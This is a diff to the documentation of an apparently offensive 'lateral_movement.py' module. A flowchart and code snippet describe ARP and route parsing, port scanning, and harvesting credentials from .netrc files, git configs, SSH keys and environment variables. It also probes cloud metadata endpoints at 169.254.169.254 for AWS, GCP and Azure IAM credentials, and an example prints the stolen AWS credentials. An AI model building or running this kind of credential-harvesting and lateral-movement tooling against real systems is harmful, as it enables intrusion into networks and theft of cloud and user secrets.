@@ -20,7 +20,7 @@ Parse ARP tables and routing tables, discover adjacent subnets, harvest credenti
 flowchart TD
     A["modules/lateral_movement.py"] --> B["NetworkDiscovery:\n  parse_arp_table() → [(ip, mac)]\n  parse_route_table() → populates nd.routes [{iface,dest,gw,mask,flags}]\n  scan_subnets([cidr_list], ports=[22,80,443,3306,5432]) → populates nd.live_hosts\n    nd.live_hosts: {ip: {port: banner}}\n    Threaded TCP connect scan"]
     B --> C["CredentialHarvester:\n  harvest_netrc() → List[dict]  /home/*/.netrc\n  harvest_git_credentials() → List[dict]  .git/config, .gitconfig\n  harvest_ssh_keys() → via SSHKeyEnumerator\n  harvest_env_tokens() → APITokenDetector (env vars)"]
-    C --> D["CloudMetadataProber:\n  probe_aws(timeout=2) → dict\n    GET 169.254.169.254/latest/meta-data/iam/security-credentials/\n    → role name + {AccessKeyId, SecretAccessKey, Token}\n  probe_gcp(timeout=2) → dict\n    GET 169.254.169.254/computeMetadata/v1/ (Metadata-Flavor: Google)\n  probe_azure(timeout=2) → dict\n    GET 169.254.169.254/metadata/instance?api-version=2021-02-01\n  → cloud credentials or None"]
+    C --> D["CloudMetadataProber:\n  probe_all() → self.results dict\n    aws_imdsv1: {status, keys}\n    aws_imdsv2: {status, token}\n    aws_iam_creds: {role, credentials_json}\n    gcp_metadata: {status, project_id, service_accounts, ...}\n    azure_imds: {status, subscription_id, ...}\n    oci_imds: {status, ...}\n  Note: probe_aws/gcp/azure/oci are private — call probe_all() only"]
     D --> E["APITokenDetector:\n  scan_env_variables() → List[dict]\n    os.environ: match API_KEY, TOKEN, SECRET, AWS_*, GITHUB_TOKEN\n  scan_config_files(paths) → List[dict]\n    Regex for token-like strings in /etc/, /opt/, ~/.config/"]
 ```
 
@@ -51,7 +51,8 @@ results = cloud.probe_all()
 # keys: aws_imdsv1, aws_imdsv2, aws_iam_creds, gcp_metadata, azure_imds, etc.
 aws = results.get('aws_iam_creds', {})
 if aws:
-    print(f"AWS IAM: role={aws.get('role')}  AccessKeyId={aws.get('AccessKeyId')}")
+    # credentials_json is the raw JSON string from IMDS
+    print(f"AWS IAM: role={aws.get('role')}  creds_json={aws.get('credentials_json', '')[:80]}")
 ```
 
 ---
